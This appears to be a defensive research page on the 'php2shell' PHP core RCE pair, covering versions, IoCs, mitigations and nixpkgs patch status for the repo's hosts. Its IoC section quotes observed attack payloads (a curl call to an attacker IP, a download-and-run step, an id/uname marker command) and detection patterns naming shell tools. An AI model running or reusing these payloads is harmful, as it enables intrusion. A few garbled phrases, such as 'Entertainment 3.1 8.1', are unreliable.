---
status: current (researched 2026-10-22, 1 day after disclosure)
source: https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w, https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp, https://www.php.net/archive/2026.php#2026-10-21-5, https://www.wiz.io/blog/php2shell-php-rce, https://calif.io/php2shell/, https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/, https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/, https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/
topic: php2shell (PHP 2026-10-21 core RCE pair) — CVE-2026-109618 OOM corruption, CVE-2026-109619 stale global state; versions, serving modes, IoCs, mitigations, nixpkgs patch status
---

# Source: PHP "php2shell" pair of core RCEs (CVE-2026-109618 / CVE-2026-109619)

Released 2026-10-21 14:00 UTC. Two independent pre-auth memory-safety flaws in
the PHP core request lifecycle, each CVSS v4.0 **9.2**
(`CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`, CWE-416,
-755, -824, -1325, -1419). NVD added its own CVSS 3.1 9.8 entry for
CVE-2026-109619 [threatwire](https://www.threatwire.tech/cve/cve-2026-109619).
Primary advisories: [GHSA-w8hw-w9fx-j79w ("RCE via OOM
corruption")](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
and [GHSA-6wmf-4rv5-p3rp ("RCE via stale global
state")](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
(both published 2026-10-21), plus the official PHP security
[advisory/announcement](https://www.php.net/archive/2026.php#2026-10-21-5).

## What the two CVEs are

- **CVE-2026-109618 — RCE via OOM corruption.** PHP uses `longjmp()`
  (`zend_bailout()`) for out-of-memory errors; if allocation fails while
  request memory is only *partially initialized* (e.g. Zend hash buckets are
  marked live — `nNumUsed`/`nNumOfElements` incremented — *before* the key
  allocation that may fatal), the worker exits that context without state
  repair and request *shutdown* later reads/branches on the invalid data as if
  valid → UAF/corruption → RCE. The failing allocation need not be related to
  the corrupted memory. Multipart-parse OOM vectors stay *within* apparent
  limits:
  - a multipart request without a usable declared `Content-Length` (chunked
    HTTP/1.1, lengthless HTTP/2, or input-decompression filters) passes the
    `post_max_size` check that only compares *declared* length, then keeps
    feeding decoded body data — [GHSA](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w);
  - one part may carry an unrestricted number of *headers* ("header
    amplification"): small on the wire, far larger once represented in PHP;
  - empty file controls (`filename=""`) do not count toward
    `max_file_uploads` but still create all six `$_FILES` entries
    (*name/full_path/type/tmp_name/error/size*), and nested field names
    (`files[a][b][…]`) multiply array allocs — hundreds of records exceed the
    default 128 MiB heap while the body stays below the default 8 MiB
    `post_max_size` — [calif.io](https://calif.io/php2shell/).
- **CVE-2026-109619 — RCE via stale global state.** Worker-retained globals
  (error, session, object, extension state — e.g. `PS(id)`,
  `PS(http_session_vars)`, `EG(last_fatal_error_backtrace)`, `BG(unserialize)`)
  point to *request-owned* memory and must be reset before the request heap is
  freed; fatal errors (incl. OOM) skip the reset, and nonfatal shutdown/late
  diagnostics can *repopulate* cleared state → later request hits lifetime
  dangling pointers → UAF, memory disclosure, RCE. Producer+consumer model;
  both requests must land on the **same worker process**.
  [GHSA](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)
- Wiz grouped four demonstrated bug families under the two CVEs:
  upload-progress unserializer UAF, remote process-memory disclosure
  (URL-encodes reclaimed heap into the `PHPSESSID` response cookie — works
  even when the app never calls `session_start()`), fatal-error backtrace UAF
  (8.5 only), and an OPcache cross-worker type confusion —
  [Wiz](https://www.wiz.io/blog/php2shell-php-rce).
- Repro facts: unauth RCE as the **web worker account**; confirmed over HTTP
  against mod_php with *default* input/memory limits in normal prefork
  configurations; session-lifecycle RCE validated on **mod_php and FPM**;
  runs *before any application code* (any PHP script exposes the path, even
  `hello world`; command runs during cleanup of the failed request) —
  [GHSA](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w),
  [Datadog](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/).
- Research credits: Calif (Ryan Austin/@lcfr_hax), Wiz (Sagi Tzadik et al.),
  OpenAI "Patch the Planet"; PHP-gov participation via the PHP Foundation
  — [calif.io](https://calif.io/php2shell/),
  [Wiz](https://www.wiz.io/blog/php2shell-php-rce). Discovery used LLM agents
  (Wiz Atlas/Gemini 4 Argon/GPT-5.6 Sol); the vulnerable patterns date back
  >10 years (Stefan Esser's memory-limit bug era 2004; PHP bug #78876 in 2020;
  OSTIF/Quarkslab audit found a relative in 2024, exploit unproven) —
  [calif.io](https://calif.io/php2shell/).
- Patch removes `longjmp()` OOM handling: delayed graceful soft-OOM at the
  next VM safe point + hard `_exit()` at a second threshold; plus full reset
  of surviving global state — [GHSA](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w).

## Versions

| | affected | fixed |
|---|---|---|
| PHP 8.5.x | 8.5.0 – **8.5.11** | **8.5.12** |
| PHP 8.4.x | 8.4.0 – **8.4.26** | **8.4.27** |
| PHP 8.3.x | 8.3.0 – **8.3.35** | **8.3.36** |
| PHP 8.2.x | 8.2.0 – **8.2.34** | **8.2.35** |

- (GHSA database form: "affected < 8.2.35 / < 8.3.36 / < 8.4.27 / < 8.5.12" —
  i.e. within the four supported branches.) Last vulnerable point releases
  were 2026-09-24 (8.2.34, 8.3.35, 8.4.26, 8.5.11) —
  [php.net archive](https://www.php.net/archive/2026.php#2026-10-21-5),
  [GHSA](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w).
- **Older/historical range:** "equivalent bugs ... affect versions as old as
  PHP 5.4"; Google: "all versions of PHP from 5.4 through 8.5.11";
  Calif: earliest reachable path 5.4.0 (one variant 7.3+). PHP 8.1 and older
  are EOL upstream; the PHP security team shipped *minimal source-only
  backports* on git branches `PHP-{7.4,8.0,8.1}-CVE-2026-109618-109619` —
  [php.net](https://www.php.net/archive/2026.php#2026-10-21-5),
  [Google Cloud](https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619),
  [calif.io](https://calif.io/php2shell/).
- PHP 8.2 EOL **2026-12-31**; remirepo had no updates on release day —
  [php.net](https://www.php.net/archive/2026.php#2026-10-21-5).

## Who is at risk (serving modes)

Official: "all PHP installations serving web requests — PHP-FPM, Apache with
mod_php, php-cgi, FrankenPHP, LiteSpeed" —
[php.net](https://www.php.net/archive/2026.php#2026-10-21-5).
Risk **highest on mod_php** (demonstrated exploit fires *before any
application code*) [php.net](https://www.php.net/archive/2026.php#2026-10-21-5).

| setup | CVE-…618 (OOM) | CVE-…619 (stale state) | why |
|---|---|---|---|
| Apache mod_php | RCE confirmed | RCE confirmed | shutdown runs *unconditionally* even after failed request startup (`zend_first_try`/`php_apache_request_dtor` → `php_request_shutdown`) — consumes invalid/stale state, worker survives and is reused |
| PHP-FPM (nginx/Apache/Caddy front) | susceptible (by source analysis; **no complete FPM exploit demonstrated** for this CVE) | RCE confirmed (session-lifecycle path, application-dependent) | FPM *exits the child* on failed request startup (→ `php_module_shutdown(); return FPM_EXIT_SOFTWARE`), which blocks the easiest path, but FPM still runs shutdown after successful startup → OOM/app fatals leave stale state; frontend `PHP_VALUE`/`PHP_ADMIN_VALUE` applying before request init is a second early consumer |
| php-cgi | affected (listed in scope) | affected | official list |
| FrankenPHP | likely susceptible (analogous to mod_php: unconditional shutdown) | likely (no default early-config consumer established) | |
| LiteSpeed LSAPI | likely/application-dependent | conditional candidate | models FPM |
| CLI/cron | not covered by advisories | not covered | same package, upgraded anyway |

Sources: the two GHSAs (Susceptibility/Consumers sections),
[PHP Foundation](https://thephp.foundation/blog/2026/10/21/todays-php-security-release-and-how-were-strengthening-php-security/),
[calif.io](https://calif.io/php2shell/),
[php2shell.uk](https://php2shell.uk/technical) (vendor-neutral tabulation).

## Timeline (leak/disruption)

- 2026-08-01/11–21: Calif & Wiz find and report to PHP (RCE PoC confirmed by
  PHP 08-15) — [calif.io](https://calif.io/php2shell/),
  [Wiz](https://www.wiz.io/blog/php2shell-php-rce).
- **2026-10-17:** MadPot honeypot logs a PHP2Shell exploit attempt from
  anonymization network IP `103.216.220.92`, **4 days pre-disclosure** —
  [AWS](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/).
- **2026-10-20 ~15:00 UTC:** CVE IDs + mitigation advice leak (wrong CVSS 10.0;
  no technical details) —
  [PHP Foundation](https://thephp.foundation/blog/2026/10/21/todays-php-security-release-and-how-were-strengthening-php-security/),
  [Check Point](https://blog.checkpoint.com/security/php2shell-what-we-know-about-the-leaked-critical-php-vulnerabilities-cve-2026-109618-cve-2026-109619/).
  Release moved a day earlier: originally planned 2026-10-22 14:00 UTC →
  [php.net advance notice](https://www.php.net/archive/2026.php#2026-10-20-1),
  BleepingComputer 20 Oct
  (watchTowr first confirmed authenticity/repro of CVE-…618) —
  [BleepingComputer](https://www.bleepingcomputer.com/news/security/php-warns-admins-of-two-critical-flaws-emergency-patches-coming-tomorrow/).
- 2026-10-21 pre-dawn: PoC exploits circulating 02:00–08:00 UTC from multiple
  anonymized actors [AWS](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/);
  Cloudflare default-on WAF protections since 03:02 UTC (~9 h ahead)
  [Cloudflare](https://blog.cloudflare.com/php-vulnerabilities-waf-protection/);
  **first exploitation request visible on ELLIO sensor 08:36 UTC**, 5.5 h pre-patch
  [ELLIO](https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/);
  VulnCheck saw probing from 08:37 UTC
  [php2shell.uk](https://php2shell.uk/detection).
- **2026-10-21 14:00 UTC:** patched releases 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.
  UK NCSC + CISA alerts: update immediately or take offline —
  [NCSC](https://www.ncsc.gov.uk/news/critical-security-issue-affecting-php),
  [threatwire](https://www.threatwire.tech/cve/cve-2026-109619).
- 2026-10-22: Amazon calls it "broadly exploited in the wild" —
  [BleepingComputer](https://www.bleepingcomputer.com/news/security/amazon-says-php2shell-exploitation-began-4-days-before-patches/).

## Exploitation status & KEV

- In-the-wild: pre-disclosure attempt (10-17, MadPot) + many post-disclosure
  attempts; unclear if any pre-disclosure attempt succeeded against real
  systems —
  [AWS](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/).
- Not in CISA KEV (catalog snapshot 2026.10.21) —
  [threatwire](https://www.threatwire.tech/cve/cve-2026-109619),
  [Check Point](https://blog.checkpoint.com/security/php2shell-what-we-know-about-the-leaked-critical-php-vulnerabilities-cve-2026-109618-cve-2026-109619/).
- Conflicting vendor views on 10-21 (worth remembering when judging "was I
  hit" answers): Cloudflare CTO — attacks emerging; watchTowr — exploitation
  observed via its honeypots; Huntress — none observed on partner fleet by
  10am ET (and again 4:30pm ET); THN reported watchTowr saw *none* by 11:26
  UTC (conflicts with its FAQ) —
  [safeguard.sh roundup](https://safeguard.sh/resources/blog/find-and-patch-every-php-runtime-after-php2shell),
  [Huntress](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities).
- Unverified Aikido claim that compromise sweeps should go back to **June
  2026** (zero-day-for-months theory) — flagged unverified; PHP reported no
  such exploitation — [eSentire](https://www.esentire.com/security-advisories/php2shell-cve-2026-109618-cve-2026-109619).

## Detection / IoCs (patch-era attackers active since ~2026-10-17)

Traffic-level (per ELLIO's Deception Network + watchTowr/hunt helpers):

- user agents: `php2shell-scan/109618`, `php2shell-109618`,
  `php2shell-verify/1.0`, `Mozilla/5.0 (php2shell-check/1.0)`,
  `Mozilla/5.0 (php-session-startup-rce-poc)` —
  [ELLIO](https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/),
  [PeakHour](https://www.peakhour.io/blog/recognising-vulnerability-scanners/).
- multipart boundaries beginning `----p2s` incl. `----p2shell`, `------atk`,
  `--nucleiBoundary`; canaries `P2SMARK`/`P2SMK` in the progress field;
  PoC default marker `JACKALPOC` (`uname -a; id; echo JACKALPOC`) —
  [ELLIO](https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/).
- multipart POSTs carrying a `PHP_SESSION_UPLOAD_PROGRESS` part (signal, not
  verdict — legitimate upload-progress users send it too); bodies with
  hundreds of empty file fields or deeply-nested field names; no/small/
  missing `Content-Length` with large decoded bodies —
  [ELLIO](https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/),
  [ESSIO... Armis](https://www.armis.com/blog/php2shell-how-to-find-prioritize-and-patch-affected-systems/).
- phase-2 samples: download of `http://92.118.112.100/nfs` to `/tmp N run
  with arg `php` (2nd-stage SHA-256
  `0c5486f06620e26e316f4b33f318b0d646d5e1133789331aa2fed012360d1486`; body
  hashes `43898a0a…` session-tool, `7bc41ed7…` OOM-tool); progress field
  `system('curl http://15.235.206.16:8443')` —
  [ELLIO](https://ellio.tech/en/blog/php2shell-what-we-observed-and-what-to-do/).
- host-side: memory-limit fatals right after multipart POSTs; bursts of 500s
  from one client; workers dying SIGSEGV/SIGABRT or churning; **unusually long
  / percent-encoded PHPSESSID cookies** (memory-disclosure path, check
  Set-Cookie at proxy/log layer); unexpected children of PHP/web-server
  processes (sh/bash/curl/wget/`/dev/tcp`); new .php in webroot —
  [php2shell.uk](https://php2shell.uk/detection),
  [Armis](https://www.armis.com/blog/php2shell-how-to-find-prioritize-and-patch-affected-systems/),
  [Huntress](https://www.huntress.com/blog/php2shell-leaked-critical-php-vulnerabilities),
  [Datadog](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/).
- No official IOC list from PHP (NetSPI) —
  [NetSPI](https://www.netspi.com/blog/executive-blog/critical-vulnerability/php2shell-unauthenticated-rce-on-php-cve-2026-109618-cve-2026-109619/).
- App logs may show nothing: bug runs below the application —
  [Wiz](https://www.wiz.io/blog/php2shell-php-rce),
  [Datadog](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/).
- **Log-horizon rule:** review back to at least **2026-10-17** (pre-disclosure
  exploitation) rather than the 10-21 patch date; Amazon: "defenders should
  not assume the public disclosure date is the earliest date of exploitation" —
  [AWS](https://aws.amazon.com/blogs/security/amazon-threat-intelligence-identifies-php2shell-exploitation-prior-to-public-disclosure-in-madpot/),
  [BleepingComputer](https://www.bleepingcomputer.com/news/security/amazon-says-php2shell-exploitation-began-4-days-before-patches/).
- Assumed consequences for an unpatched internet-facing PHP host: treat
  memory-disclosure as possible → rotate DB passwords/API keys/session keys;
  look for web shells/cron/accounts —
  [Armis](https://www.armis.com/blog/php2shell-how-to-find-prioritize-and-patch-affected-systems/),
  [ProjectDiscovery](https://projectdiscovery.io/research/php2shell),
  [php2shell.uk](https://php2shell.uk/faq).

## Version check (host)

```sh
php -v                       # web SAPI version is what matters, not CLI
for b in /usr/bin/php* /usr/sbin/php-fpm* /usr/local/bin/php; do [ -x "$b" ] && echo "$b: $("$b" -v 2>/dev/null | head -1)"; done
sudo grep -lE '(php|libphp).*\(deleted\)' /proc/[0-9]*/maps 2>/dev/null   # should print nothing after upgrade+restart
# NixOS: version attribute is enough — `nix eval nixpkgs#php84.version`
```
[ProjectDiscovery](https://projectdiscovery.io/research/php2shell),
[NetSPI](https://www.netspi.com/blog/executive-blog/critical-vulnerability/php2shell-unauthenticated-rce-on-php-cve-2026-109618-cve-2026-109619/).
On NixOS a *nix store restart matters*: master/php-fpm processes started
before the new package keep old code mapped until restart
([safeguard.sh](https://safeguard.sh/resources/blog/find-and-patch-every-php-runtime-after-php2shell)).

## Mitigation (patch is the only complete fix)

> There are no complete mitigations, updating is the only safe choice. —
> [php.net security release](https://www.php.net/archive/2026.php#2026-10-21-5)

Official (partial, per-attack-path) relief —
[php.net](https://www.php.net/archive/2026.php#2026-10-21-5),
[GHSAs](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w):

- CVE-…618: `memory_limit=-1` (enforced so apps can't override — FPM pool
  `php_admin_value`, Apache config; verify no pool/dir/app re-sets a finite
  limit) — removes the *predictable per-request* exploit lever but `mmap()`
  failures can still `longjmp()` (incomplete); keep `post_max_size` low
  (8M no-uploads / 32M uploads) and `upload_max_filesize < post_max_size`;
  enforce decoded-size/field-count/part-count/header-count/nesting-depth at
  the frontend **including requests without usable Content-Length**; cgroup
  `memory.max` OK as availability boundary (kill only one worker policy);
  **do NOT use `RLIMIT_AS`/`RLIMIT_DATA`** (mmap failures hit the vulnerable
  path). N.b. `memory_limit=-1` trades eval-RCE-freedom for memory-exhaustion
  DoS risk — [calif.io](https://calif.io/php2shell/).
- CVE-…619: `session.upload_progress.enabled=0` in php.ini / FPM pool /
  server config applying *before request parsing* (not `ini_set()`, not FPM
  `.user.ini`) + restart every worker; PHP 8.5: `fatal_error_backtraces=0` +
  restart; remove invalid/deprecated per-request INI settings that warn;
  fix attacker-reachable fatal errors & `Maximum execution time exceeded`;
  hiding diagnostics (`error_reporting`, `display_errors`, `@`) does NOT help.
  php2shell.uk/FLI advise keeping `session.upload_progress.enabled=0` even
  after patching ([GHSA](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
  [JFrog](https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/)).
- `pm.max_requests=1` breaks the same-worker reuse of stale state (perf
  cost) — [GHSA](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp),
  [AWS WAF blog](https://aws.amazon.com/blogs/security/using-aws-waf-to-apply-mitigations-for-php2shell-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619/),
  [JFrog](https://research.jfrog.com/post/php2shell-all-you-need-to-know-about-cve-2026-109618-and-cve-2026-109619/).
- WAF as defense-in-depth **only**: Cloudflare/WAF rules launched pre-patch
  (target multipart/progress-field patterns; "full transaction detection"
  using origin response too; free-tier default-on since 10-21 03:02 UTC);
  AWS WAF covers the progress-field & no-upload-multipart cases but *cannot*
  cover header amplification under the byte cap, or anything triggered
  server-side (`fatal_error_backtraces`, INI diagnostics) — i.e. "one of the
  two vulnerabilities is largely outside the reach of any web application
  firewall"; Google Cloud Armor file-upload+RFI managed rules —
  [Cloudflare](https://blog.cloudflare.com/php-vulnerabilities-waf-protection/),
  [AWS WAF blog](https://aws.amazon.com/blogs/security/using-aws-waf-to-apply-mitigations-for-php2shell-rce-vulnerabilities-cve-2026-109618-and-cve-2026-109619/),
  [Google Cloud](https://cloud.google.com/blog/products/identity-security/responding-to-core-php-vulnerabilities-cve-2026-109618-cve-2026-109619).
  watchTowr goes further: "Mitigations that involve changes to .ini files
  should be understood to be ineffective and not suitable to prevent
  exploitation" (i.e. treat all .ini tweaks as *not* preventing it) —
  [watchTowr](https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/).
- Take internet-facing unpatchable PHP offline (NCSC/CISA) —
  [NCSC](https://www.ncsc.gov.uk/news/critical-security-issue-affecting-php),
  [threatwire](https://www.threatwire.tech/cve/cve-2026-109619).
- Scale context: ~884k internet-facing hosts advertised PHP ≤8.1 of ~1.5M
  reporting a version (+740k no version) (Shodan banners, 10-20; OX/Mallory);
  Wikimedia & major sites took parts offline during patching —
  [ProjectDiscovery](https://projectdiscovery.io/research/php2shell),
  [OX Security](https://www.ox.security/blog/cve-2026-109618-cve-2026-109619-two-vulnerabilities-allow-unauthenticated-rce-in-php/).

## Severity disagreements (do not silently average)

- PHP/others: CVSS 4.0 9.2 each. NVD 3.1: 9.8 (they list NVD's own score) —
  [threatwire](https://www.threatwire.tech/cve/cve-2026-109619).
  Red Hat: CVE-…618 Entertainment 3.1 8.1 (Important), and notes standard
  RHEL deployments use PHP-FPM (not mod_php), making code execution harder in
  practice — [safeguard.sh](https://safeguard.sh/resources/blog/find-and-patch-every-php-runtime-after-php2shell).
- Leaked posts claimed 10.0 — wrong (actual 9.2) —
  [PHP Foundation](https://thephp.foundation/blog/2026/10/21/todays-php-security-release-and-how-were-strengthening-php-security/),
  [Check Point](https://blog.checkpoint.com/security/php2shell-what-we-know-about-the-leaked-critical-php-vulnerabilities-cve-2026-109618-cve-2026-109619/).

> CONTRADICTION: watchTowr's affected-version table lists "PHP 5 and 7: All
> affected / No patches available", and BleepingComputer relayed "PHP
> versions 5, 6, 7, and 8" (PHP 6 never shipped). php.net officially says
> source-only backports *exist* for 7.4/8.0/8.1 (for self-builds), no
> distribution fixes for 5.x. The safest phrasing: ≤8.1 = affected, no
> upstream binary release; source backports exist for 7.4/8.0/8.1.
> Sources: [watchTowr](https://watchtowr.com/intelligence/php-remote-code-execution-php2shell/),
> [php.net](https://www.php.net/archive/2026.php#2026-10-21-5).

## Nixpkgs patch status (researched 2026-10-22)

- **Merged 2026-10-21**: [PR #576853](https://github.com/NixOS/nixpkgs/pull/576853)
  "php: 8.3.35 → 8.3.36, 8.4.26 → 8.4.27, 8.5.11 → 8.5.12, fixes
  CVE-2026-109618, CVE-2026-109619" by Ma27, 6 commits; merge commit
  [`c53532a`](https://github.com/NixOS/nixpkgs/commit/c53532a938651ed45ebef072c8da6e74256e7072)
  merged into master by mweinelt ~14:5x UTC (~1 h post-release). ~560
  rebuilds, `1.severity: security`. Same PR also marked `php86` (8.6.0RC3)
  insecure ("No patches for the RC available", commit
  [`60e2de1`](https://github.com/NixOS/nixpkgs/pull/576853/commits/60e2de1de6df17621d7de2f5bd9a2c0a39a92c5a));
  test breakage along the way from the patched `filter`-OOM tests
  (`oom_filter_*.phpt`) fixed in commit
  (`a5fc1be`). [Discourse thread](https://discourse.nixos.org/t/php2shell-9-2-cve-published-today/80668/2).
- Redundant contributor PRs closed: [#576852](https://github.com/NixOS/nixpkgs/pull/576852)
  (8.4.26→8.4.27), [#576854](https://github.com/NixOS/nixpkgs/pull/576854)
  (8.5.11→8.5.12);
  [#576680](https://github.com/NixOS/nixpkgs/pull/576680)
  (`knownVulnerabilities` marker-only PR) also closed.
- **php82 (8.2.35):** NOT on nixpkgs master (unstable has 8.3/8.4/8.5 only);
  php82 exists on the `nixos-26.05` branch. mweinelt in
  [#576853](https://github.com/NixOS/nixpkgs/pull/576853): "Backport will be
  manual, since we have 8.2 on nixos-26.05 but not on master" ("backport
  release-26.05" label added then removed). As of 2026-10-22 *no ph82 8.2.35
  backport PR is visible in the repo search for "CVE-2026-1096"* — status
  UNVERIFIED for nixos-26.05.
- FrankenPHP: [PR #577351](https://github.com/NixOS/nixpkgs/pull/577351)
  "frankenphp: 1.12.7 → 1.13.2" open as of 10-22 (severity: security) —
  update in flight, not merged when researched.
- **This repo's pin (corrected during capture, 2026-10-22):** the root
  `nixpkgs` input follows lock **node `nixpkgs_8`** =
  `nixos-unstable` @
  [`55bfb4d7437bd4e09ab7cba58a43bd68eb310044`](https://github.com/NixOS/nixpkgs/commit/55bfb4d7437bd4e09ab7cba58a43bd68eb310044)
  (shallow git, lastModified 1791956154 = 2026-10-14 05:35 UTC). The lock's
  inner *node named `nixpkgs`* (`nixpkgs-unstable` @ `ac6b2166`, 2026-08-25)
  is **not** the root pin — it is a child input other flakes follow; do not
  read the outer pin from it. That pinned snapshot packages php
  **8.3.35 / 8.4.26 / 8.5.11** (`php.version` = 8.4.26, i.e. latest-stable =
  php84 at that rev) — already verified by evaluating the pinned rev
  (`nix eval github:NixOS/nixpkgs/55bfb4d7437bd4e09ab7cba58a43bd68eb310044#php{83,84,85}.version`).
  The second nixpkgs input `nixpkgs-master` follows **master**
  @ `9e917916c...` (locked 2026-10-17 07:34 UTC) — also pre-fix, used only
  through `pkgsUnstable` on lenny (the block in `modules/system/update.nix`
  is commented out); no php service is sourced from it.
  - Both php services in the repo therefore run the **last vulnerable
    release 8.4.26**: nextcloud35 on mrpotatohead (NixOS nextcloud module
    defaults `services.nextcloud.phpPackage` to `php84` at that rev) and
    zabbix74.web on woody (generic `services.phpfpm.pools.zabbix`, default
    `phpPackage = pkgs.php` = 8.4.26).
  - A `nix flake update nixpkgs nixpkgs-master` (or full update) once the
    channel tips contain
    [`c53532a`](https://github.com/NixOS/nixpkgs/commit/c53532a938651ed45ebef072c8da6e74256e7072)
    **lands patched php 8.3.36/8.4.27/8.5.12** as a package bump — no local
    security backport is required on this flake. Verify afterwards from the
    *new* nixpkgs node in `flake.lock` (the root-followed one!):
    `nix eval github:NixOS/nixpkgs/<new-rev>#php84.version` must be ≥ 8.4.27,
    then rebuild the affected hosts (`nixos-rebuild switch` restarts the
    changed `phpfpm-nextcloud`/`phpfpm-zabbix` units; running workers keep
    the old binary mapped until the restart). Details and hardening levers:
    [risk concept page](../concepts/php-serving-modes-risk.md).

## Utility pages used (secondary)

- Independent vendor-neutral site: [php2shell.uk](https://php2shell.uk/faq)
  (technical/FAQ/detection pages; last reviewed 2026-10-22).
- Version checker [php2shellcheck.com](https://php2shellcheck.com/faq/) —
  key nuance: distro back-ports often carry fixes "under an older version
  string"; compare against vendor fixed-package tables, not just upstream
  versions.
- Detector pages: [Datadog](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/),
  [Elastic](https://www.elastic.co/security-labs/threat-command/php2shell-php-rce-detection),
  [ProjectDiscovery](https://projectdiscovery.io/research/php2shell),
  [uable not-fetched primary: OpenAI
  blog](http://openai.com/index/coordinated-disclosure-of-critical-vulnerabilities);
  Konfirmity advisory listed at
  [konfirmity.com/advisories](https://www.konfirmity.com/advisories)
  (published 2026-10-21, updated 2026-10-22; not fetched in full).
